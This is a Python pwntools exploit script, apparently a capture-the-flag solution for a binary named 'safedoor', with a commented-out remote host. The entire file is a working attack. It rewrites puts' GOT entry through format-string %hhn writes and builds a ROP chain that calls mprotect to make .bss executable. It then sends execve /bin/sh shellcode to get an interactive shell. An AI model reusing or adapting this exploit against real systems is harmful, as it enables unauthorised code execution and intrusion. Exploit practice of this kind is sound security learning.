from pwn import *

p = process('./safedoor')
# p = remote('219.146.15.117',8000)
elf = ELF('safedoor')
puts_got = elf.got['puts']
mprotect_plt = elf.symbols['mprotect']
gets_plt = elf.symbols['gets']

bss_addr = elf.bss(0)
ppp_ret = 0x080486cd
p_ret = 0x080483e1
call_eax = 0x80484f6

p.recvuntil('KEY:')
m_p = 0x080485B4

# gdb.attach(p,'b* 0x080485BD\nc')
for x in range(2):
	l = (m_p >> (x*8)) &0xff
	payload = p32(puts_got+x)+"%%%dc"%(l-4)+"%4$hhn..."
	p.sendline(payload)
	p.recvuntil('...')
l = (m_p >> (2*8)) &0xff
payload = p32(puts_got+2)+"%4$hhn..."
p.sendline(payload)
p.recvuntil('...')

l = (m_p >> (3*8)) &0xff
payload = p32(puts_got+3)+"%%%dc"%(l-4)+"%4$hhn..."
p.sendline(payload)
p.recvuntil('...')

p.sendline('STjJaOEwLszsLwRy')

#put shellcode
# buf =  "\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# shellcode = buf+(0x88+4-len(buf))*'A'
payload1 = 'A'*140+p32(mprotect_plt)+p32(ppp_ret)+p32(bss_addr)+p32(0x28)+p32(7)+p32(gets_plt)+p32(p_ret)+p32(bss_addr)+p32(bss_addr)
p.sendline(payload1)
shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
p.sendline(shellcode)
p.interactive()